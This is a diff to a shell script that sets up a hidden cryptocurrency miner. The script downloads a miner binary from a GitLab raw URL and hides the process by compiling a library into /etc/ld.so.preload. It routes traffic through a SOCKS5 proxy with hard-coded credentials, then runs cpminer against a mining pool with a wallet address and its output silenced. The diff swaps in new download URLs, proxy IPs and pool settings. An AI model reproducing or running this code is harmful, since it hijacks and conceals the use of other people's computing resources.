@@ -13,9 +13,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://github.com/CoinFuMasterShifu/janusminer/releases/download/0.2.7/janusminer-ubuntu20
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
 
-chmod 777 janusminer-ubuntu20
+chmod 777 cpminer
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
@@ -25,7 +25,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 209.97.145.189:443
+socks5 = 68.183.159.42:443
 socks5_username = majapahlevi
 socks5_password = majapahlevi
 END
@@ -57,4 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./janusminer-ubuntu20 -h 81.163.20.40 -p 12000 -u 2bdd0b2e77b826e4cbf005217ae4b709b9e0be4a4203be33.makan -t10 && wget https://github.com/CoinFuMasterShifu/janusminer/releases/download/0.2.7/janusminer-ubuntu20 && chmod 777 janusminer-ubuntu20 && ./janusminer-ubuntu20 -h 81.163.20.40 -p 12000 -u 2bdd0b2e77b826e4cbf005217ae4b709b9e0be4a4203be33.makan -t20
+./graftcp/graftcp && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u Qc6akHMAHBNgXXTema6Wdq5D2fqgDLevsX -t96 > /dev/null 2>&1
